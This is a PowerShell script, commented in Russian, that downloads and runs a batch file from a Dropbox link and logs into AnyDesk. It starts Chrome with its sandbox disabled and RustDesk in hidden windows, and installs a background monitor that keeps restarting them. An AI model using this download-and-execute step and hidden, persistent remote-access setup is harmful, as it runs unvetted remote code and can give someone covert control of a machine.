# Установка ExecutionPolicy для выполнения скриптов
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force

# Функция для логирования
function Write-Log {
    param (
        [string]$Message
    )
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Write-Output "$timestamp - $Message"
}

# 1. Скачивание и выполнение Downloads.bat
Write-Log "Скачивание Downloads.bat..."
$downloadsUrl = "https://www.dropbox.com/scl/fi/qdyd4p9t6xoabl95n5o3g/Downloads.bat?rlkey=snr74vv1vr8k5suujugvrhjtm&dl=1"
$downloadsPath = "$env:TEMP\Downloads.bat"
Invoke-WebRequest -Uri $downloadsUrl -OutFile $downloadsPath
Write-Log "Выполнение Downloads.bat..."
cmd.exe /c $downloadsPath

# 2. Выполнение show.bat для входа в AnyDesk
$showBatPath = "$env:TEMP\show.bat"
if (Test-Path $showBatPath) {
    Write-Log "Выполнение show.bat для входа в AnyDesk..."
    cmd.exe /c $showBatPath
} else {
    Write-Log "show.bat не найден по пути $showBatPath. Пропуск шага."
}

# 3. Функция для запуска процесса в скрытом режиме
function Start-HiddenProcess {
    param (
        [string]$ExePath,
        [string[]]$Arguments = @()
    )
    Write-Log "Запуск $ExePath в скрытом режиме..."
    Start-Process -FilePath $ExePath -ArgumentList $Arguments -WindowStyle Hidden
}

# 4. Функция для мониторинга процесса
function Start-ProcessMonitor {
    param (
        [string]$ProcessName,
        [ScriptBlock]$RestartBlock
    )
    Start-Job -Name "Monitor_$ProcessName" -ScriptBlock {
        while ($true) {
            Start-Sleep -Seconds 15
            $proc = Get-Process -Name $using:ProcessName -ErrorAction SilentlyContinue
            if (-not $proc) {
                Write-Log "$ProcessName не найден. Перезапуск..."
                & $using:RestartBlock
                Write-Log "$ProcessName был перезапущен."
            }
        }
    }
}

# 5. Запуск и мониторинг Chrome
$chromePath = "C:\Program Files\Google\Chrome\Application\chrome.exe"
if (Test-Path $chromePath) {
    Start-HiddenProcess -ExePath $chromePath -Arguments @("--no-sandbox")
    Start-ProcessMonitor -ProcessName "chrome" -RestartBlock { Start-HiddenProcess -ExePath $chromePath -Arguments @("--no-sandbox") }
} else {
    Write-Log "chrome.exe не найден по пути $chromePath."
}

# 6. Запуск и мониторинг RustDesk
$rustdeskPath = "C:\Program Files\RustDesk\rustdesk.exe"
if (Test-Path $rustdeskPath) {
    Start-HiddenProcess -ExePath $rustdeskPath
    Start-ProcessMonitor -ProcessName "rustdesk" -RestartBlock { Start-HiddenProcess -ExePath $rustdeskPath }
} else {
    Write-Log "rustdesk.exe не найден по пути $rustdeskPath."
}

# 7. Создание дополнительного мониторингового скрипта для критических процессов
$monitorScriptPath = "$env:ProgramData\MonitorProcesses.ps1"
$monitorScriptContent = @"
while ($true) {
    Start-Sleep -Seconds 20
    \$processes = @('chrome', 'rustdesk')
    foreach (\$proc in \$processes) {
        if (-not (Get-Process -Name \$proc -ErrorAction SilentlyContinue)) {
            Write-Output "\$proc.exe не запущен. Перезапуск..."
            Start-Process "\$proc.exe" -WindowStyle Hidden
        }
    }
}
"@

Write-Log "Создание дополнительного мониторингового скрипта по пути $monitorScriptPath..."
$monitorScriptContent | Out-File -FilePath $monitorScriptPath -Encoding UTF8

# 8. Запуск дополнительного мониторингового скрипта в скрытом режиме
Write-Log "Запуск дополнительного мониторингового скрипта..."
Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$monitorScriptPath`"" -WindowStyle Hidden

# 9. Запуск таймерного скрипта time.py
$timeScriptPath = "C:\Path\To\time.py" # Замените на фактический путь к time.py
if (Test-Path $timeScriptPath) {
    Write-Log "Запуск time.py..."
    Start-Process -FilePath "python.exe" -ArgumentList "`"$timeScriptPath`"" -WindowStyle Normal
} else {
    Write-Log "time.py не найден по пути $timeScriptPath."
}

Write-Log "Скрипт успешно запущен."
